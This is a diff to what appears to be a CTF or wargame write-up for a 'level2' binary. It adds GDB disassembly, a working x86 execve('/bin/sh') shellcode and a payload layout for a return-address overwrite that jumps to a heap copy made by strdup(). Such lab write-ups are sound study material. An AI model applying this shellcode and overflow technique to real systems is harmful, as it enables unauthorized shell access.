@@ -1,6 +1,6 @@
 LEVEL_2:
 # 📚 Exploiting `level2` – Exploit the overflow to get a shell.
-this is a heap overflow, we execute shellcode from the heap using strdup().
+since stack has execution protection this is a heap overflow, we execute shellcode from the heap using strdup().
 
 Exploit Strategy:</br>
 
@@ -22,14 +22,41 @@ strdup() gives us a writable+executable space for shellcode.
 
 Find heap address after strdup() using GDB:
 ```
-break *0x0804853d
-run < <(python exploit.py)
-info registers
+(gdb) b p
+(gdb) r
+(gdb) disass p
+...
+0x08048535 <+97>:	mov    %eax,(%esp)
+0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+0x0804853d <+105>:	leave  
+0x0804853e <+106>:	ret  
+(gdb) break *0x0804853d
+(gdb) run < <(python exploit.py)
+(gdb) info registers
 ```
 Craft payload:
 
 Shellcode: 25-byte Linux x86 execve("/bin/sh").
+```sh
+shellcode = (
+    "\x31\xc0"          # xor eax,eax        ; clear eax
+    "\x50"              # push eax           ; push NULL
+    "\x68\x2f\x2f\x73\x68" # push "//sh"
+    "\x68\x2f\x62\x69\x6e" # push "/bin"
+    "\x89\xe3"          # mov ebx,esp        ; ebx -> "/bin//sh"
+    "\x50"              # push eax           ; push NULL (argv terminator)
+    "\x53"              # push ebx           ; push pointer to "/bin//sh"
+    "\x89\xe1"          # mov ecx,esp        ; ecx -> argv[]
+    "\x99"              # cdq                ; edx = 0
+    "\xb0\x0b"          # mov al,0xb         ; syscall number for execve
+    "\xcd\x80"          # int 0x80           ; syscall
+)
 
+[ shellcode ....... ]   (goes into heap by strdup)
+[ padding AAAAA... ]    (76 bytes, fills stack buffer)
+[ BBBB             ]    (overwrites saved EBP)
+[ 0x0804a008       ]    (overwrites RET with heap addr)
+```
 Padding to 76 bytes.</br>
 Overwrite EBP (4 bytes).</br>
 Overwrite RET with heap address.
